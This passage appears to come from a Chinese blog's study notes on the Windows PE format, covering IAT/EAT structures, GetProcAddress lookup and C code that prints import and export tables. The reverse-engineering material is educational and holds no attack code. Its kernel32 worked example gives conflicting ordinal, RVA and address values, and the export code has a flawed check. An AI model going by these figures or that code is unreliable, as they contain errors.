<span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_THUNK_DATA32</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>        DWORD ForwarderString;      <span class="hljs-comment">// PBYTE </span><br>        DWORD Function;             <span class="hljs-comment">// PDWORD</span><br>        DWORD Ordinal;<br>        DWORD AddressOfData;        <span class="hljs-comment">// PIMAGE_IMPORT_BY_NAME</span><br>    &#125; u1;<br>&#125; IMAGE_THUNK_DATA32;<br><span class="hljs-keyword">typedef</span> IMAGE_THUNK_DATA32 * PIMAGE_THUNK_DATA32;<br></code></pre></td></tr></table></figure><blockquote><p>需要说明的是，当 IMAGE_THUNK_DATA 值的最高位为 1时，表示函数以序号方式导入，这时候低 31位被看作一个函数序号。（可以用预定义值IMAGE_ORDINAL_FLAG32或80000000h来对最高位进行测试）。</p><p>当 IMAGE_THUNK_DATA 值的最高位为 0时，表示函数以字符串类型的函数名方式导入，这时双字的值是一个 RVA，指向一IMAGE_IMPORT_BY_NAME 结构。</p></blockquote><p>​而其中，每个地址值分别指向IMAGE_IMPORT_BY_NAME结构体。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//@[comment(&quot;MVI_tracked&quot;)]</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_IMPORT_BY_NAME</span> &#123;</span><br>    WORD    Hint;<br>    CHAR   Name[<span class="hljs-number">1</span>];<br>&#125; IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;<br></code></pre></td></tr></table></figure><p>​跟踪数组的第一个值26D3C（RVA），其FOA为23F3C：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC13%E7%AB%A0%20PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F.assets/image-20211201185127343.png" alt="image-20211201185127343"></p><p>​进入该地址，可以看到导入的API函数的名称字符串。文件偏移23F3C最初的2个字节值（02B0）为Ordinal，在上述结构体中即为那个WORD变量，它是库中函数的固有编号。</p><p>​Ordinal的后面 为函数名称字符串GetProcAddress（同C语言一样，字符串末尾以Terminating NULL[‘\0’ ]结束）。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC13%E7%AB%A0%20PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F.assets/image-20211201175112947.png" alt="image-20211201175112947"></p><p>​可以看下之前放的图，对理解有帮助，如下：<br><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC13%E7%AB%A0%20PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F.assets/image-20211201125729065.png" alt="image-20211201125729065"></p><ol start="3"><li>FirstThunk - IAT (Import Address Table)</li></ol><p>​IAT的RVA:26068即为RAW:23268</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC13%E7%AB%A0%20PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F.assets/image-20211201185040061.png" alt="image-20211201185040061"></p><p>​图13-17中文件偏移23268~234C0区域即为IAT数组区域，对应于kernel32.dll库。它与INT类似，由结构体指针数组组成，且以NULL结尾。</p><p>​IAT的第一个元素值被硬编码为26D3C，该值无实际意义，notepad.exe文件加载到内存时，PE装载器会使用相应API的起始地址替换该值。替换后的值是准确的。</p><blockquote><ul><li><p>微软在制作服务包过程中重建相关系统文件，此时会硬编入准确地址（普通的 DLL实际地址不会被硬编码到IAT中，通常带有与INT相同的值）。 </p></li><li><p>另外，普通DLL文件的ImageBase为10000000,所以经常会发生DLL重定位。但是Windows系统DLL文件（kernel32&#x2F;user32&#x2F;gdi32等）拥有自身固有的ImageBase，不会出现DLL重定位。</p></li></ul></blockquote><p>下面使用x32dbg查看notepad.exe的IAT，如图13-18所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC13%E7%AB%A0%20PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F.assets/image-20211201192123159.png" alt="image-20211201192123159"></p><p>GetProcAddress函数的IAT地址为836068,其值为769FF550，它是API准确的起始地址值。</p><p>若在其他OS ( 2000、Vista 等）或服务包（SP1、SP2 )中运行notepad.exe（这个notepad是从win10的syswow64里复制出来的32位notepad），836068地址中会被设置为其他值（相应OS的kernel32.dll的GetProcAddress地址）。</p><p>进入769FF550地址中，如上图所示，可以看到该处即为kernel32.dll的GetProcAddress函数的起始位置。</p><p>以上是对IAT的基本讲解，都是一些初学者不易理解的概念。反复阅读前面的讲解，并且实际进入相应地址查看学习，将非常有助于对概念的掌握。IAT是Windows逆向分析中的重要概念，一定要熟练把握。后面学习带有变形IAT的PE Patch文件时，会进一步学习IAT相关知识。</p><h2 id="自实现代码解析-4"><a href="#自实现代码解析-4" class="headerlink" title="自实现代码解析"></a>自实现代码解析</h2><p>IAT表分析代码实现：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs c">VOID <span class="hljs-title function_">printImport</span><span class="hljs-params">()</span> &#123;<br>    LPVOID pFileBuffer = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_DOS_HEADER pDosHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_NT_HEADERS pNTHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_FILE_HEADER pPEHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_OPTIONAL_HEADER32 pOptionHeader = <span class="hljs-literal">NULL</span>;<br>    ReadPEFile(FILEPATH_IN, &amp;pFileBuffer);<br>    pDosHeader = (PIMAGE_DOS_HEADER) pFileBuffer;<br>    pNTHeader = (PIMAGE_NT_HEADERS) ((DWORD) pFileBuffer + pDosHeader-&gt;e_lfanew);<br>    pPEHeader = (PIMAGE_FILE_HEADER) (((DWORD) pNTHeader) + <span class="hljs-number">4</span>);<br>    pOptionHeader = (PIMAGE_OPTIONAL_HEADER32) ((DWORD) pPEHeader + IMAGE_SIZEOF_FILE_HEADER);<br>    DWORD import_foa = (DWORD) pFileBuffer + RVAtoFOA(pFileBuffer, pOptionHeader-&gt;DataDirectory[<span class="hljs-number">1</span>].VirtualAddress);<br>    PIMAGE_IMPORT_DESCRIPTOR pImportDescriptor = (PIMAGE_IMPORT_DESCRIPTOR) import_foa;<br>    <span class="hljs-comment">//Traverse the data to find the num of blocks.</span><br>    <span class="hljs-comment">// Check every byte in IMAGE_IMPORT_DESCRIPTOR</span><br>    <span class="hljs-type">int</span> num = <span class="hljs-number">0</span>;<br>    boolean break_flag = FALSE;<br>    PIMAGE_IMPORT_DESCRIPTOR pTemp = pImportDescriptor;<br>    <span class="hljs-keyword">while</span> (pTemp-&gt;Name != <span class="hljs-literal">NULL</span>) &#123;<br>        num++;<br>        pTemp++;<br>    &#125;<br>    <span class="hljs-comment">//Traverse the data to process each block.</span><br>    pTemp = pImportDescriptor;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; num; j++) &#123;<br>        <span class="hljs-type">char</span> *dll_name = (<span class="hljs-type">char</span> *) ((DWORD) pFileBuffer + RVAtoFOA(pFileBuffer, (pTemp + j)-&gt;Name));<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s :\n&quot;</span>, dll_name);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;----------------------------\n&quot;</span>);<br>        <br>        PIMAGE_THUNK_DATA pThunkData = (PIMAGE_THUNK_DATA) ((DWORD) pFileBuffer + RVAtoFOA(pFileBuffer, (pTemp + j)-&gt;OriginalFirstThunk));<br><br>        PIMAGE_IMPORT_BY_NAME pImageImportByName = (PIMAGE_IMPORT_BY_NAME) ((DWORD) pFileBuffer + RVAtoFOA(pFileBuffer, pThunkData-&gt;u1.Ordinal));<br>        <span class="hljs-keyword">while</span> (TRUE) &#123;<br>            <span class="hljs-keyword">if</span> ((pThunkData-&gt;u1.Ordinal &amp; IMAGE_ORDINAL_FLAG) == <span class="hljs-number">0</span>) <span class="hljs-comment">// the highest bit is 0</span><br>            &#123; <span class="hljs-comment">// Fetch function name in each dll</span><br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, pImageImportByName-&gt;Name);<br>                pImageImportByName = (PIMAGE_IMPORT_BY_NAME) ((DWORD) pFileBuffer + RVAtoFOA(pFileBuffer, pThunkData-&gt;u1.Ordinal));<br><br>            &#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">//The highest bit is 1</span><br>                DWORD ordinal = ((pThunkData-&gt;u1.Ordinal &lt;&lt; <span class="hljs-number">1</span>) &gt;&gt; <span class="hljs-number">1</span>);<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Import by ordinal: %lx\n&quot;</span>, ordinal);<br>            &#125;<br>            pThunkData++;<br>            <span class="hljs-keyword">if</span> (pThunkData-&gt;u1.Ordinal == <span class="hljs-number">0</span>) &#123; <span class="hljs-keyword">break</span>; &#125;<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>效果截图：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC13%E7%AB%A0%20PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F.assets/image-20211201203347502.png" alt="image-20211201203347502"></p><h1 id="13-6-EAT"><a href="#13-6-EAT" class="headerlink" title="13.6 EAT"></a>13.6 EAT</h1><p>​Windows操作系统中，“库”是为了方便其他程序调用而集中包含相关函数的文件（DLL&#x2F;SYS)。Win32 API是最具代表性的库，其中的kernel32.dll文件被称为最核心的库文件。<br>​EAT是一种核心机制，它使不同的应用程序可以调用库文件中提供的函数。也就是说，只有通过EAT才能准确求得从相应库中导岀函数的起始地址。与前面讲解的IAT—样，PE文件内的特定结构体（IMAGE_EXPORT_DIRECTORY）保存着导出信息，且PE文件中仅有一个用来说明库EAT的IMAGE_EXPORT_DIRECTORY结构体。</p><blockquote><p>对比之下，用来说明IAT的IMAGE_IMPORT_DESCRIPTOR结构体以数组形式存在，且拥有多个成员。这样是因为PE文件可以同时导入多个库。而我们的IMAGE_EXPORT_DIRECTORY只能有一个。</p></blockquote><p>​可以在PE文件的PE头中查找到IMAGE_EXPORT_DIRECTORY结构体的位置。IMAGE_OPTIONAL_HEADER32.DataDirectory[0].VirtualAddress 值即是 IMAGE_EXPORT_DIRECTORY结构体数组的起始地址（也是RVA的值）。</p><p>​下图显示的是kernel32.dll文件的IMAGE_OPTIONAL_HEADER32.DataDirectory[0]（第一个4字节为VirtualAddress，第二个4字节为Size成员）</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC13%E7%AB%A0%20PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F.assets/image-20211202205310896.png" alt="image-20211202205310896"></p><h2 id="13-6-1-IMAGE-EXPORT-DIRECTORY"><a href="#13-6-1-IMAGE-EXPORT-DIRECTORY" class="headerlink" title="13.6.1 IMAGE_EXPORT_DIRECTORY"></a>13.6.1 IMAGE_EXPORT_DIRECTORY</h2><p>IMAGE EXPORT DIRECTORY结构体如下代码所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//@[comment(&quot;MVI_tracked&quot;)]</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_EXPORT_DIRECTORY</span> &#123;</span><br>    DWORDCharacteristics;<br>    DWORDTimeDateStamp;            <span class="hljs-comment">//输出表的创建时间</span><br>    WORDMajorVersion;                      <span class="hljs-comment">//输出表的主版本号。未使用设置为0</span><br>    WORDMinorVersion;                      <span class="hljs-comment">//输出表的次版本号。未使用设置为0</span><br>    DWORDName;                <span class="hljs-comment">//指向一个与输出函数关联的文件名的RVA </span><br>    DWORDBase;                <span class="hljs-comment">//到处函数的起始序号</span><br>    DWORDNumberOfFunctions;        <span class="hljs-comment">//导出函数的总数</span><br>    DWORDNumberOfNames;            <span class="hljs-comment">//以名称到处的函数总数</span><br>    DWORDAddressOfFunctions;        <span class="hljs-comment">//指向到处函数地址表的RVA</span><br>    DWORDAddressOfNames;            <span class="hljs-comment">//指向函数名地址表的AVA</span><br>    DWORDAddressOfNameOrdinals;            <span class="hljs-comment">//指向函数名序号表的RVA</span><br>&#125; IMAGE_EXPORT_DIRECTORY, *pIMAGE_EXPORT_DIRECTORY<br></code></pre></td></tr></table></figure><p>下面讲解其中的重要成员（全部地址均为RVA),如下表所示。</p><table><thead><tr><th>项目</th><th>含义</th></tr></thead><tbody><tr><td>NumberOfFunctions</td><td>实际Export函数的个数</td></tr><tr><td>NumberOfNames</td><td>Export函数中具名的函数个数</td></tr><tr><td>AddressOfFunctions</td><td>Export函数地址数组（数组元素个数&#x3D;NumberOfFunctions）</td></tr><tr><td>AddressOfNames</td><td>函数名称地址数组（数组元素个数&#x3D;NumberOfNames）</td></tr><tr><td>AddressOfNameOrdinals</td><td>Ordinal地址数组（数组元素个数&#x3D;NumberOfNames）</td></tr></tbody></table><p>下图描述了kernel32.dll文件的IMAGE_EXPORT_DIRECTORY结构体与整个EAT结构。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC13%E7%AB%A0%20PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F.assets/image-20211202153710240.png" alt="image-20211202153710240"></p><p>从库中获得函数地址的API为GetProcAddress()函数。该API引用EAT来获取指定API的地址。<br>GetProcAddress() API拥有函数名称，下面讲解它如何获取函数地址。理解了这一过程，就等于征服了EAT。</p><p>GetProcAddress()操作原理</p><ul><li>(1)利用AddressOfNames成员转到“函数名称数组”。</li><li>(2) “函数名称数组”中存储着字符串地址。通过比较（strcmp）字符串，查找指定的函数名称（此时数组的索引称为name_index )。</li><li>(3)利用 AddressOfNameOrdinals 成员，转到ordinal 数组。 </li><li>(4)在ordinal数组中通过name_index查找相应ordinal值。</li><li>(5)利用AddressOfFunctions成员转到“函数地址数组”（EAT）。</li><li>(6)在“函数地址数组”中将刚刚求得的ordinal用作数组索引，获得指定函数的起始地址。</li></ul><p>上图描述的是kernel32.dll文件的情形。kernel32.dll中所有导岀函数均有相应名称，<br>AddressOfNameOrdinals数组的值以index&#x3D;ordinal的形式存在。但并不是所有的DLL文件都如此。<br>导出函数中也有一些函数没有名称（仅通过ordinal导岀），AddressOfNameOrdinals数组的值为index!&#x3D;ordinal。所以只有按照上面的顺序才能获得准确的函数地址。</p><blockquote><p>​对于没有函数名称的导出函数，可以通过Ordinal查找到它们的地址。从Ordinal值中减去IMAGE_EXPORT_DIRECTORY.Base成员后得到一个值，使用该值作为“函数地址数组”的索引，即可查找到相应函数的地址。</p></blockquote><h2 id="13-6-2-使用-kernel32-dll-练习"><a href="#13-6-2-使用-kernel32-dll-练习" class="headerlink" title="13.6.2 使用 kernel32.dll 练习"></a>13.6.2 使用 kernel32.dll 练习</h2><p>下面看看如何实际从kernel32.dll文件的EAT中查找AddAtomW函数并获取其函数地址。kernel32.dll的IMAGE_EXPORT_DIRECTORY结构体RVA为92D30，换算成RAW为78D30。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC13%E7%AB%A0%20PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F.assets/image-20211202205340163.png" alt="image-20211202205340163"></p><p>使用010Editor进入78D30偏移处，如下图所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC13%E7%AB%A0%20PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F.assets/image-20211202205619615.png" alt="image-20211202205619615"></p><p>将几个成员的值抽取出来，如下所示：</p><table><thead><tr><th align="center">文件偏移</th><th align="center">成员</th><th align="center">值</th><th align="center">RAW</th></tr></thead><tbody><tr><td align="center">98BE0h</td><td align="center">DWORD  Characteristics</td><td align="center">0</td><td align="center">-</td></tr><tr><td align="center">98BE4h</td><td align="center">time_t TimeDateStamp</td><td align="center">02&#x2F;08&#x2F;2016 21:48:04</td><td align="center">-</td></tr><tr><td align="center">98BE8h</td><td align="center">WORD MajorVersion</td><td align="center">0</td><td align="center">-</td></tr><tr><td align="center">98BEAh</td><td align="center">WORD MinorVersion</td><td align="center">0</td><td align="center">-</td></tr><tr><td align="center">98BECh</td><td align="center">DWORD Name</td><td align="center">96C1Eh</td><td align="center">-</td></tr><tr><td align="center">98BF0h</td><td align="center">DWORD Base</td><td align="center">1</td><td align="center">-</td></tr><tr><td align="center">98BF4h</td><td align="center">DWORD NumberOfFunctions</td><td align="center">1607(647h)</td><td align="center">-</td></tr><tr><td align="center">98BF8h</td><td align="center">DWORD NumberOfNames</td><td align="center">1607(647h)</td><td align="center">-</td></tr><tr><td align="center">98BFCh</td><td align="center">DWORD AddressOfFunctions</td><td align="center">92D58h</td><td align="center">.rdata FOA &#x3D;  0x78D58</td></tr><tr><td align="center">98C00h</td><td align="center">DWORD AddressOfNames</td><td align="center">94674h</td><td align="center">.rdata FOA &#x3D; 0x7A674</td></tr><tr><td align="center">98C04h</td><td align="center">DWORD  AddressOfNameOrdinals</td><td align="center">95F90h</td><td align="center">.rdata FOA &#x3D; 0x7BF90</td></tr></tbody></table><p>下面通过模拟GetProcAddress()获取函数地址的方式对各个字段进行讲解。</p><ol><li>函数名称数组</li></ol><p>AddressOfNames成员的值为RVA&#x3D;94674,即RAW&#x3D;7A674。使用010Editor查看该地址，如下图</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC13%E7%AB%A0%20PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F.assets/image-20211202210107851.png" alt="image-20211202210107851"></p><p>此处为4字节RVA组成的数组。数组元素个数为NumberOfNames ( 647h）。遍历所有RVA值即可发现函数名称字符串。</p><ol start="2"><li>查找指定函数名称</li></ol><p>要查找的函数名称字符串为“AddAtomW”，在上图中遍历到第六个元素的值RVA数组的值(RVA:96D23→RAW:7CD23)即可。</p><p>进入相应地址就会看到“AddAtomW”字符串，如下图所示。此时“AddAtomW”函数名即是上图数组的第六个元素，数组索引为5。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC13%E7%AB%A0%20PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F.assets/image-20211202210945251.png" alt="image-20211202210945251"></p><ol start="3"><li>Ordinal数组</li></ol><p>下面查找 “AddAtomW” 函数的Ordinal值。AddressOfNameOrdinals成员的值为RVA:95F90→RVA:7BF90。</p><p>在下图中可以看到，深色部分是由多个2字节的ordinal组成的数组（ ordinal数组中的各元素大小为2个字节)。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC13%E7%AB%A0%20PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F.assets/image-20211202211136196.png" alt="image-20211202211136196"></p><ol start="4"><li>ordinal</li></ol><p>将2中求得的index值(5)应用到3中的Ordinal数组即可求得Ordinal(8)。<br>AddressOfNameOrdinals[index]&#x3D;ordinal</p><p>(index&#x3D;5,ordinal&#x3D;8)</p><ol start="5"><li>函数地址数组-EAT</li></ol><p>最后查找AddAtomW的实际函数地址。AddressOfFunctions成员的值为RVA:92D58→RVA:78D58。 下图深色部分即为4字节函数地址RVA数组，它就是Export函数的地址。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC13%E7%AB%A0%20PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F.assets/image-20211202211332384.png" alt="image-20211202211332384"></p><ol start="6"><li>AddAtomW函数地址</li></ol><p>图13-26中，为了获取“AddAtomW”函数的地址，将第4步所求的Ordinal用作上图数组的索引，得到RVA&#x3D;1B8D0。</p><p>AddressOfFunctions[ordinal]&#x3D;RVA</p><p>(ordinal&#x3D;7,RVA&#x3D;195A0)</p><p>使用x32dbg进行验证，kernel32.dll的ImageBase&#x3D;7A270000。因此AddAtomW函数的实际地址（VA）为7A2895A0（7A270000+1B8D0&#x3D;7A28B8D0）。如下图所示：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC13%E7%AB%A0%20PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F.assets/image-20211202213955074.png" alt="image-20211202213955074"></p><p>以上过程是在DLL文件中查找Export函数地址的方法，这与使用GetProcAddress() API获取指定函数地址的方法一致。</p><p>最基本、最重要的部分到此就全部讲完了。要理解这些内容并不容易，若有不理解的暂且保留，通过实际操作慢慢理解</p><h2 id="自实现代码解析-5"><a href="#自实现代码解析-5" class="headerlink" title="自实现代码解析"></a>自实现代码解析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c">VOID <span class="hljs-title function_">printExport</span><span class="hljs-params">()</span> &#123;<br>    LPVOID pFileBuffer = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_DOS_HEADER pDosHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_NT_HEADERS pNTHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_FILE_HEADER pPEHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_OPTIONAL_HEADER32 pOptionHeader = <span class="hljs-literal">NULL</span>;<br>    ReadPEFile(FILEPATH_IN, &amp;pFileBuffer);<br>    pDosHeader = (PIMAGE_DOS_HEADER) pFileBuffer;<br>    pNTHeader = (PIMAGE_NT_HEADERS) ((DWORD) pFileBuffer + pDosHeader-&gt;e_lfanew);<br>    pPEHeader = (PIMAGE_FILE_HEADER) (((DWORD) pNTHeader) + <span class="hljs-number">4</span>);<br>    pOptionHeader = (PIMAGE_OPTIONAL_HEADER32) ((DWORD) pPEHeader + IMAGE_SIZEOF_FILE_HEADER);<br>    DWORD export_foa = (DWORD) pFileBuffer + RVAtoFOA(pFileBuffer, pOptionHeader-&gt;DataDirectory[<span class="hljs-number">0</span>].VirtualAddress);<br>    PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY) export_foa; <span class="hljs-comment">// The real export dir</span><br>    <span class="hljs-comment">//Convert the address</span><br>    DWORD aof_in_file =<br>            (DWORD) pFileBuffer + (DWORD) RVAtoFOA(pFileBuffer, pImageExportDirectory-&gt;AddressOfFunctions); <span class="hljs-comment">//All of them are address</span><br>    DWORD aon_in_file = (DWORD) pFileBuffer + (DWORD) RVAtoFOA(pFileBuffer, pImageExportDirectory-&gt;AddressOfNames);<br>    DWORD aono_in_file = (DWORD) pFileBuffer + (DWORD) RVAtoFOA(pFileBuffer, pImageExportDirectory-&gt;AddressOfNameOrdinals);<br><br>    PDWORD begin_aof_foa = (PDWORD) aof_in_file;<br>    <span class="hljs-comment">// Find the index</span><br>    PDWORD temp_aof_foa = begin_aof_foa;<br>    <span class="hljs-type">int</span> aof_index;<br>    DWORD aono_index;<br>    DWORD address;<br>    DWORD num_of_func_by_name = (aono_in_file - aon_in_file) / <span class="hljs-number">4</span>;<br>    <span class="hljs-type">char</span> *func_name;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;------------------------------------------\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Ordinal\t\tRVA\t\tFunction Name\n&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; num_of_func_by_name; i++) &#123;<br>        aof_index = i;<br>        address = *(PDWORD) temp_aof_foa++;<br>        aono_index = valueToIndex(aof_index, (PWORD) aono_in_file, num_of_func_by_name);<br>        <span class="hljs-keyword">if</span> (address != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">if</span> (aono_index + pImageExportDirectory-&gt;Base &gt;= pImageExportDirectory-&gt;Base) &#123; <br>                <span class="hljs-comment">// Then the aono_index is -1, no name for the function.</span><br>                PDWORD aon_pointer = (PDWORD) aon_in_file;<br>                func_name = (<span class="hljs-type">char</span> *) (RVAtoFOA(pFileBuffer, *(aon_pointer + i)) + (DWORD) pFileBuffer);<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%lu\t\t%lx\t\t%s\n&quot;</span>, aof_index + pImageExportDirectory-&gt;Base, address, func_name);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%lu\t\t%lx\t\t-\n&quot;</span>, aof_index + pImageExportDirectory-&gt;Base, address);<br>            &#125;<br>        &#125;<br>    &#125;<br><br><br>&#125;<br><br><span class="hljs-comment">//Convert in the AddressOfNameOrdinals table</span><br>DWORD <span class="hljs-title function_">valueToIndex</span><span class="hljs-params">(<span class="hljs-type">int</span> value, PWORD initial_address, DWORD search)</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; search; i++) &#123;<br>        <span class="hljs-keyword">if</span> (value == *initial_address++) &#123;<br>            <span class="hljs-keyword">return</span> i;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="13-7-高级PE"><a href="#13-7-高级PE" class="headerlink" title="13.7 高级PE"></a>13.7 高级PE</h1><p>前面我们花了相当长时间来学习PE文件格式相关知识。虽然可以根据PE规范逐一学习各结构体成员，但前面的学习中仅抽取与代码逆向分析息息相关的成员进行了说明。其中IAT&#x2F;EAT相关内容是运行时压缩器（Run-timePacker）、反调试、DLL注入、API钩取等多种中高级逆向主题的基础知识。希望各位多训练使用Hex Editor,铅笔、纸张逐一计算IAT&#x2F;EAT的地址，再找到文件&#x2F;内存中的实际地址。虽然要掌握这些内容并不容易，但是由于其在代码逆向分析中占有重要地位，<br>所以只有掌握它们，才能学到高级逆向技术。</p><h2 id="13-7-1-PEView-exe"><a href="#13-7-1-PEView-exe" class="headerlink" title="13.7.1 PEView.exe"></a>13.7.1 PEView.exe</h2><p>下面向各位介绍一个简单易用的PE Viewer应用程序（PEView.exe ）(个入编写的免费公开SW ）。</p><p><a href="http://www.magma.ca/~wjr/PEView.zip">http://www.magma.ca/~wjr/PEView.zip</a></p><p>下图是PEView.exe的运行界面。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC13%E7%AB%A0%20PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F.assets/image-20211204101345636.png" 